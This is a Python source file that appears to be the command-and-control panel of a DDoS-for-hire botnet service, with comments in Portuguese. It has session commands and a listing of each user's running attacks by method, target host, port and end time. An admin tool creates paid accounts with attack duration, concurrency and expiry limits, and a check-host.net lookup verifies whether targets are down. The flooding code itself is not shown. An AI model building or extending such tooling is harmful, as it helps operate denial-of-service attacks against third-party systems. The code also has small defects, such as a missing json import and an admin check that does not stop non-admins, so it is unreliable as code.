import socket, time, os, requests
from src.database import users
from src.utils import *
from src.env import env
from typing import Dict, List, Optional, Tuple

def clear(sock, user=None):
    send(sock,'\033c')
    send(sock,process(banners(env['cnc']['default_banners'].get('welcome')), sock))

def exit(sock, user=None):
    """
    Encerra a sessão.
    """
    for i in range(3):
        send(sock,
            f"Exiting in {3-i} seconds\r"
        )
        time.sleep(1)

    sock.close()

    if env and user:
        try:
            del env['users']['clients'][sock]
        except KeyError:
            pass

    return False

def echo(sock, receive=None, user=None):
    """
    Recebe e retorna texto.
    """
    send(sock,"echo> ")
    text = receive(sock, user=user)

    send(sock,
            f"\x1b[F{text}          \n"
        )

def history(sock, user=None):
    """
    Mostra histórico de comandos.
    """
    history = env['users'].get(
        'user-command-history',
        {}
    ).get(user, [])

    for command in history:
        rcmd = command['cmd']+' '+' '.join(command['args'])
        send(sock,
            f"{rcmd}\n"
        )
    if env['users']['clients'][sock]['debug']:
        print(history)

def ongoing(sock, user=None):
    x = attacks.count(user, returnsdata=True)
    y = []
    for i in x:
        z = {}
        z['id'] = i['id']
        z['method'] = i['method']
        z['host'] = i['host']
        z['port'] = i['port']
        z['ends in'] = gettimeinto(start=i['end_time'])
        y.append(z)
    send(sock, asciitable(y))

# - - - - - - - - 
# -  admincmd   -
# - - - - - - - -

def debug(sock, command=None):
    debug = env['users']['clients'][sock]['debug']
    is_admin = env['users']['clients'][sock]['user'] in env['users']['roots']
    if not is_admin:
        send(
            sock,
            f"{process(env['core']['errors'].get('404'), sock)}\n"
        )
    if not command["args"]:
        send(sock,simplebox("debug <enable/disable>"))
        return
    action = command["args"][0].lower()
    if action == "enable":
        if not debug:
            env['users']['clients'][sock]['debug'] = True
            send(sock,
                "Debug activated, all infos will be showed as raw.\n"
            )

            log(
            "DebugFunction",
            f"account: {env['users']['clients'][sock]['user']} enabled the debug function"
            )
        else:
            send(sock,
            "Your debug is already enabled.\n"
            )
    elif action == "disable":
        env['users']['clients'][sock]['debug'] = False
        send(sock,
        "Debug deactivated.\n"
        )
    else:
        send(sock,simplebox(
        "debug <enable/disable>"
        ))

def user_manager(sock, receive=None, user=None, command=None):
    if not command["args"]:
        send(sock, simplebox(
            ("users create\n"
             "users delete\n"
             "users edit\n"
             "users editall\n"
             "users count\n")
            ))
        return
    action = command["args"].pop(0).lower()
    match action:
        case "create":
            if len(command["args"]) > 0:
                action = command["args"].pop(0).lower()
                match action:
                    case "?" | "help":
                        send(
                            sock,
                            simplebox((
                                "users create - more options than in the command."
                                "users create <name> <password> <days until expiry>"
                                "users create multiple <number of users> <days until expiry>"
                                ))
                            )
            else:
                send(sock, "New user form\nusername(32 limit): ")
                un = receive(sock, limitc=32)
                if len(un) <= 3:
                    send(
                        sock,
                        "Username needs to have at least 4 letters.\n"
                        )
                    return
                if has_special_characters(un):
                    send(
                        sock,
                        "Username can't have special characters.\n"
                        )
                    return

                send(sock,
                    "password: "
                    )
                pw = receive(sock, limitc=32)
                send(sock,
                    "\x1b[F\x1b[K\rboottime: "
                    )
                bt = receive(sock, limitc=5)
                send(sock,
                    "\x1b[F\x1b[K\rconcurrents: "
                    )
                cc = receive(sock, limitc=5)
                send(sock,
                    "\x1b[F\x1b[K\rexpiry date(in days): "
                    )
                try:
                    ex = int(
                         receive(sock, limitc=3)
                         ) * 86400
                    ex += int(time.time())
                except:
                    ex = None
                send(sock,
                    "\x1b[F\x1b[K\rvip(yes/no): "
                    )
                vp = receive(sock, limitc=3)
                if vp.lower() in ['yes', 'y']: vp = True
                else: vp = False

                x  = users.create(
                     un,
                     pw,
                     bt,
                     cc,
                     ex,
                     user,
                     vp
                    )
                if x[0]:
                    send(sock,f"{c.BRIGHT_GREEN}Success{c.R} ! \"{un}\"(id: {x[1]}) created successfully.{c.R}\n")
                    return
                send(sock,f"{c.RED}Error: {x[1]}{c.R}\n")
        case "count":
            if len(command["args"]) > 0:
                action = command["args"].pop(0).lower()
                match action:
                    case "?" | "help":
                        send(sock, 
                            simplebox(
                                ("users count\n"
                                 "users count maximized\n"
                                 "users count ips\n")
                            ))
                    case 'maximized':
                        us = users.get()
                        expired, active, total = 0, 0, 0
                        current_time = int(time.time())
                        for user in us:
                            if user[2] <= current_time:
                                expired += 1
                            else:
                                active += 1
                            total += 1
                            send(sock,
                                simplebox(
                                    (f"ID        : {user[0]}\n"
                                     f"username  : {user[1]}\n"
                                     f"expiry    : {user[2]}\n"
                                     f"created by: {user[3]}\n")
                                ))
                        send(sock,
                            simplebox(
                                (f"active  : {str(active)}\n"
                                 f"expired : {str(expired)}\n"
                                 f"total   : {str(total)}\n")
                            ))
                    case 'ips':
                        for client, info in env['users']['clients'].items():
                            send(
                                sock,
                                simplebox(
                                    f"username  : {info['user']}\n"
                                    f"ip address: {info['addr']}\n"
                                    f"uptime    : {gettimeinto(finish=info['uptime'])}\n"
                                )
                            )
                    case _:
                        send(sock, 'This option is not recognized.\n')
            else:
                us = users.get()
                expired, active, total = 0, 0, 0
                current_time = int(time.time())
                for user in us:
                    if user[2] <= current_time:
                        expired += 1
                    else:
                        active += 1
                    total += 1
                send(sock,
                        simplebox(
                            (f"active  : {str(active)}\n"
                             f"expired : {str(expired)}\n"
                             f"total   : {str(total)}\n")
                        ))
        case "delete":
            if len(command["args"]) == 0:
                send(
                    sock,
                    simplebox((
                        "users delete <username/id> "
                        ))
                    )
            else:
                if users.get(command["args"][0]):
                    send(
                        sock,
                        'You\'re sure to delete this user\'s account(y/N): '
                        )
                    r = receive(sock, limitc=3)
                    if r not in ['yes', 'y']:
                        return
                    d = users.delete(command["args"][0])
                    if d:
                        send(
                            sock,
                            (
                             '\x1b[F\x1b[K\r'
                             f'{c.BRIGHT_GREEN}Success{c.R} ! user "{command["args"][0]}" deleted\n'
                             )
                            )
                        return
                    send(
                        sock,
                        f'{c.BRIGHT_RED}Fail{c.R} ! invalid name/id'
                        )
        case _:
            send(sock,
                "type \"users <action> help\" to get help\n"
            )

def check_host(sock, user=False, command=False):
    """
    Verifica a conectividade de um host usando diferentes métodos via check-host.net
    """
    # Verifica argumentos
    def _format_tcp_udp(node_name, country, city, node_result, method):
        """Formata resultados TCP/UDP"""
        output = []
        
        # Verifica se o nó ainda está processando
        if node_result is None:
            output.append(f"{country}, {city}: Still processing...")
            return output
        
        # Verifica se é uma lista válida
        if not isinstance(node_result, list) or len(node_result) == 0:
            output.append(f"{country}, {city}: No data received")
            return output
        
        result = node_result[0]
        
        # Verifica se é um dicionário
        if not isinstance(result, dict):
            output.append(f"{country}, {city}: Invalid data format")
            return output
        
        # Verifica se tem erro
        if "error" in result:
            error_msg = result["error"]
            output.append(f"{country}, {city}:\033[31m error | false\033[0m")
        else:
            # Sucesso
            time_sec = result.get("time", "unknown")
            output.append(f"{country}, {city}:\033[32m {time_sec:.3f}s | true\033[0m")
        
        return output

    def _format_http(node_name, country, city, node_result):
        """Formata resultados HTTP"""
        output = []
        
        # Verifica se o nó ainda está processando
        if node_result is None:
            output.append(f"{country}, {city}: Still processing...")
            return output
        
        # Verifica se é uma lista válida
        if not isinstance(node_result, list) or len(node_result) == 0:
            output.append(f"{country}, {city}: No data received")
            return output
        
        result = node_result[0]
        
        # Verifica se é uma lista válida
        if not isinstance(result, list) or len(result) < 5:
            output.append(f"{country}, {city}: Invalid data format")
            return output
        
        success = result[0]
        time_sec = result[1]
        message = result[2] if len(result) > 2 else "Unknown"
        status_code = result[3] if len(result) > 3 else "Unknown"
        
        # Verifica se é erro (status 500+ ou success = 0)
        is_error = False
        if success == 0:
            is_error = True
        elif status_code != "Unknown":
            try:
                if int(status_code) >= 500:
                    is_error = True
            except (ValueError, TypeError):
                pass
        
        if is_error:
            output.append(f"{country}, {city}: \033[91mFail | {time_sec:.3f}s | {status_code}\033[0m")
        else:
            output.append(f"{country}, {city}: \033[32mOk | {time_sec:.3f}s | {status_code}\033[0m")
        
        return output

    def _format_ping(node_name, country, city, node_result):
        """Formata resultados de Ping"""
        output = []
        
        # Verifica se o nó ainda está processando
        if node_result is None:
            output.append(f"{country}, {city}: Still processing...")
            return output
        
        # Verifica se é uma lista válida
        if not isinstance(node_result, list) or len(node_result) == 0:
            output.append(f"{country}, {city}: No data received")
            return output
        
        # Conta quantos pings foram bem sucedidos
        reached_pings = 0
        total_pings = 0
        
        for ping_result in node_result:
            if ping_result is None:
                continue
                
            total_pings += 1
            if isinstance(ping_result, list) and len(ping_result) >= 1:
                if ping_result[0] == "OK":
                    reached_pings += 1
        
        # Se não houver pings, considera 0
        if total_pings == 0:
            reached_pings = 0
        else:
            # Mostra pings alcançados
            if reached_pings < 3:
                output.append(f"{country}, {city}: \033[91m{reached_pings}\033[0m")
            else:
                output.append(f"{country}, {city}: \033[32m{reached_pings}\033[0m")
        
        return output

    def _format_dns(node_name, country, city, node_result):
        """Formata resultados DNS"""
        output = []
        
        # Verifica se o nó ainda está processando
        if node_result is None:
            output.append(f"{country}, {city}: Still processing...")
            return output
        
        # Verifica se é uma lista válida
        if not isinstance(node_result, list) or len(node_result) == 0:
            output.append(f"{country}, {city}: No data received")
            return output
        
        result = node_result[0]
        
        # Verifica se é um dicionário
        if not isinstance(result, dict):
            output.append(f"{country}, {city}: Invalid data format")
            return output
        
        # Extrai registros
        a_records = result.get('A', [])
        aaaa_records = result.get('AAAA', [])
        
        # Monta resultado
        if a_records or aaaa_records:
            dns_info = []
            if a_records:
                dns_info.append(f"A: {', '.join(a_records)}")
            if aaaa_records:
                dns_info.append(f"AAAA: {', '.join(aaaa_records)}")
            output.append(f"{country}, {city}: {', '.join(dns_info)}")
        else:
            # Se não encontrou registros, considera erro
            output.append(f"\033[91m{country}, {city}: result: error (No DNS records found)\033[0m")
        
        return output
    if len(command["args"]) < 2:
        send(sock, 
            ("Usage: check-host <host> <method>\n"
             "Set a specific port putting: ':<port>' at the end of host\n"
             "Supported Methods: ping, http, tcp, dns, udp\n")
        )
        return
    
    # Métodos suportados pela API
    supported = ['ping', 'http', 'tcp', 'dns', 'udp']
    
    # Extrai argumentos
    host = command["args"].pop(0)
    action = command["args"].pop(0).lower()
    
    # Valida método
    if action not in supported:
        send(sock, f"Method '{action}' not supported. Use: {', '.join(supported)}\n")
        return
    send(sock, f'Checking host> {host[:10]}\r')
    try:
        # 1. FAZ A REQUISIÇÃO DE CHECAGEM
        check_url = f'https://check-host.net/check-{action}?host={host}&max_nodes=5'
        
        response = requests.get(
            check_url,
            headers={'Accept': 'application/json'},
            timeout=30
        )
        
        if response.status_code != 200:
            send(sock, f"API returned status {response.status_code}\n")
            return
            
        check_data = response.json()
        
        # Verifica se a requisição foi bem sucedida
        if check_data.get('ok', 0) != 1:
            send(sock, f"{check_data.get('error', 'Unknown API error')}\n")
            return
        
        request_id = check_data.get('request_id')
        nodes_info = check_data.get('nodes', {})
        
        # 2. ESPERA E OBTÉM OS RESULTADOS
        send(sock, 
            (f'                                      \r'
              'Waiting servers response')
        )
        time.sleep(2)
        
        result_url = f'https://check-host.net/check-result/{request_id}'
        
        # Tenta obter resultados com retry
        max_retries = 5
        results_data = None
        
        for attempt in range(max_retries):
            result_response = requests.get(
                result_url,
                headers={'Accept': 'application/json'},
                timeout=30
            )
            
            if result_response.status_code == 200:
                results_data = result_response.json()
                # Verifica se todos os nós responderam
                all_done = all(node_name in results_data and results_data[node_name] is not None 
                              for node_name in nodes_info.keys())
                
                if all_done:
                    break
                elif attempt < max_retries - 1:
                    time.sleep(1)
        
        if not results_data:
            send(sock, f"Failed to get results for request {request_id}\n")
            return
        
        # 3. PROCESSA E FORMATA OS RESULTADOS POR MÉTODO
        output = []
        
        for node_name, node_data in nodes_info.items():
            # Extrai informações do nó
            country = node_data[1] if len(node_data) > 1 else "Unknown"
            city = node_data[2] if len(node_data) > 2 else "Unknown"
            
            node_result = results_data.get(node_name)
            
            # Processa baseado no método
            if action == 'tcp' or action == 'udp':
                output.extend(_format_tcp_udp(node_name, country, city, node_result, action))
            elif action == 'http':
                output.extend(_format_http(node_name, country, city, node_result))
            elif action == 'ping':
                output.extend(_format_ping(node_name, country, city, node_result))
            elif action == 'dns':
                output.extend(_format_dns(node_name, country, city, node_result))
        
        # Envia resultado
        send(sock, 
            ('                                      \r'
             'Results:\n')
        )
        if output:
            send(sock, "\n".join(output) + "\n")
        else:
            send(sock, "No results available\n")
        send(
            sock, 
            f'report: https://check-host.net/check-report/{request_id}\n'
        )
    except requests.exceptions.Timeout:
        send(sock, "Error: Request timed out\n")
    except requests.exceptions.ConnectionError:
        send(sock, "Error: Connection error to check-host.net\n")
    except json.JSONDecodeError:
        send(sock, "Error: Invalid JSON response from API\n")
    except Exception as e:
        send(sock, f"Error: {str(e)}\n")


